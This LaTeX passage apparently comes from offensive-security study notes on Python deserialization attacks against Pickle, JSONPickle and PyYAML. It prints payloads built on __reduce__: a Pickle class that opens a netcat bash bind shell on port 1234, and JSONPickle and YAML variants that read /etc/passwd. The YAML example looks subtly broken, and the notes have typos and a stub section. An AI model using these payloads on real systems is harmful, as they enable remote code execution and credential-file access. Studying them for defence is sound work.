\section{Python}

There are multiple libraries for Python which implement serialization, such as:
\href{https://pyyaml.org/}{PyYAML} or
\href{https://jsonpickle.github.io/}{JSONpickle}. 

\href{https://docs.python.org/3/library/pickle.html}{Pickle} is the native implementation

\subsection{Pickle}

\subsubsection{Serialization Formats and functions}
a pickle is a program for a virtual pickle machine (PM). The PM contains a stack and a memo (long-term memory), and a pickled object is just a sequence of opcodes for the PM to execute, which will recreate an arbitrary object on the stack.

There are currently 6 different protocols which can be used for pickling. The
higher the protocol used, the more recent the version of Python needed to read
the pickle produced.

A sirialized object will start with the opcode \verb+x80+ followed by the
protocol version. For example \verb+\x80\x04+ for version 4.

\begin{verbatim}
$ python
Python 3.10.9 (main, Dec 19 2022, 17:35:49) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pickle
>>> original_data ={"gangnam":"style"}
>>> print(pickle.dumps(original_data))
b'\x80\x04\x95\x16\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x07gangnam\x94\x8c\x05style\x94s.'
>>> print(pickle.dumps(original_data, protocol=0))
b'(dp0\nVgangnam\np1\nVstyle\np2\ns.'
>>>
\end{verbatim}

The  methods serialization are \verb+pickle.dumps()+ and \verb+pickle.loads()+.

\subsubsection{Attributes modification}
do it.

\subsubsection{Arbitrary object injection}

Wwhen a pickled object is unpickled, if the pickled object contains a
definition for \verb+__reduce__+, it will be used to restore the original
object. \verb+__reduce__()+ eturns a tuple that contains:
\begin{itemize}
    \item A callable object that will be called to create the initial version
        of the object.
    \item A tuple of arguments for the callable object.

\end{itemize}


\begin{verbatim}
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
\end{verbatim}

\subsection{JSONPickle}
he technique for deserialization attacks in JSONPickle is essentially the same
as for Pickle. In both cases, you will create a payload using the
\verb+object.__reduce__()+ function. The resulting serialized object will just
look a little different.

\begin{verbatim}
import jsonpickle
import os

class RCE():
  def __reduce__(self):
    return os.system, ("head /etc/passwd",)

# Serialize (generate payload)
exploit = jsonpickle.encode(RCE())
print(exploit)

# Deserialize (vulnerable code)
jsonpickle.decode(exploit)
\end{verbatim}

Some good content covering attacks for JSONPickle and Pickle are:
\begin{itemize}
    \item
        \url{https://davidhamann.de/2020/04/05/exploiting-python-pickle/}
    \item
        \url{https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/}
\end{itemize}

\subsection{YAML (PyYAML, ruamel.yaml)}
These libraries serialize data into YAML format. Once again, we can serialize
an object with a i\verb+__reduce__+ function to get command execution. The
serialized data will be in YAML format this time. Ruamel.yaml is based on
PyYAML, so the same attack technique works for both

\begin{verbatim}
import yaml
import subprocess

class RCE():
  def __reduce__(self):
    return subprocess.Popen(["head", "/etc/passwd"])

# Serialize (Create the payload)
exploit = yaml.dump(RCE())
print(exploit)

# Deserialize (vulnerable code)
yaml.load(exploit)
\end{verbatim}

For further information, I recommend checking out the following links:
\begin{itemize}
    \item 
        \url{https://net-square.com/yaml-deserialization-attack-in-python.html}
    \item 
        \url{https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf}
\end{itemize}

\subsection{Bypass python sandox}


\href{https://python-security.readthedocs.io/security.html}{Python Security}
{\bf Python doesn’t implement privilege separation} (not “inside” Python) to reduce
the attack surface of Python. Once an attacker is able the execute arbitrary
Python code, the attacker basically gets a full access to the system. Privilege
separation can be implemented “outside” Python by putting Python inside a
{\bf sandbox}.

\href{https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes}{Bypass
Python sandboxes}
